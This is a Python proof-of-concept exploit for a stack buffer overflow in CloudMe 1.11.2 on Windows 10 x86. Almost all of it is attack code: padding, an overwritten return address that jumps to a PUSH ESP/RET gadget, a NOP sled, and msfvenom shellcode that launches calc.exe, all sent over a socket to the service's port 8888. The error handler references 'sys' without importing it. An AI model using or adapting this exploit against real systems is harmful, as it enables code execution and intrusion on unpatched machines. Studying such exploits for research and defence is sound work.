#Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2021-09-29
# Exploit Author: Francesco Fedele with copy 
#Reference:
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2 - Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"
#port = '1234'

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xdd\xc7\xba\xf5\x1c\x45\x98\xd9\x74\x24\xf4\x58"
payload += b"\x2b\xc9\xb1\x41\x31\x50\x19\x83\xe8\xfc\x03\x50"
payload += b"\x15\x17\xe9\xb9\x70\x55\x12\x42\x81\x39\x9a\xa7"
payload += b"\xb0\x79\xf8\xac\xe3\x49\x8a\xe1\x0f\x22\xde\x11"
payload += b"\x9b\x46\xf7\x16\x2c\xec\x21\x18\xad\x5c\x11\x3b"
payload += b"\x2d\x9e\x46\x9b\x0c\x51\x9b\xda\x49\x8f\x56\x8e"
payload += b"\x02\xc4\xc5\x3f\x26\x90\xd5\xb4\x74\x35\x5e\x28"
payload += b"\xcc\x34\x4f\xff\x46\x6f\x4f\x01\x8a\x04\xc6\x19"
payload += b"\xcf\x20\x90\x92\x3b\xdf\x23\x73\x72\x20\x8f\xba"
payload += b"\xba\xd3\xd1\xfb\x7d\x0b\xa4\xf5\x7d\xb6\xbf\xc1"
payload += b"\xfc\x6c\x35\xd2\xa7\xe7\xed\x3e\x59\x24\x6b\xb4"
payload += b"\x55\x81\xff\x92\x79\x14\xd3\xa8\x86\x9d\xd2\x7e"
payload += b"\x0f\xe5\xf0\x5a\x4b\xbe\x99\xfb\x31\x11\xa5\x1c"
payload += b"\x9a\xce\x03\x56\x37\x1b\x3e\x35\x52\xda\xcc\x43"
payload += b"\x10\xdc\xce\x4b\x05\xb4\xff\xc0\xca\xc3\xff\x02"
payload += b"\xaf\x3b\x4a\x0e\x86\xd3\x13\xda\x9a\xbe\xa3\x30"
payload += b"\xd8\xc6\x27\xb1\xa1\x3d\x37\xb0\xa4\x7a\xff\x28"
payload += b"\xd5\x13\x6a\x4f\x4a\x14\xbf\x0c\x56\xb6\x38\xf2"
payload += b"\xcb\x36\xc9\xa8\x7b\xc2\x4d\x3e\x1f\x59\xd2\xa7"
payload += b"\xa6\xf0\xb6\x52\x29\x66\x28\xfc\xad\x2a\xd8\x9d"
payload += b"\x03\xb7\x5c\x07\x7c\x7b\xd5\x88\x2f\xd7\xd8\x27"
payload += b"\xe0\xf9\x13\x78\x2e\x34\x60\x56\x1c\x03\xa8\xea"
payload += b"\x30\x24\xfa\xa6\x8d\x8b\xc8\x75\xda\xcb\x01\x1f"
payload += b"\x02\x68\x37\xbb\x6c\x0b\xbf\x26\x71"
overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)




 
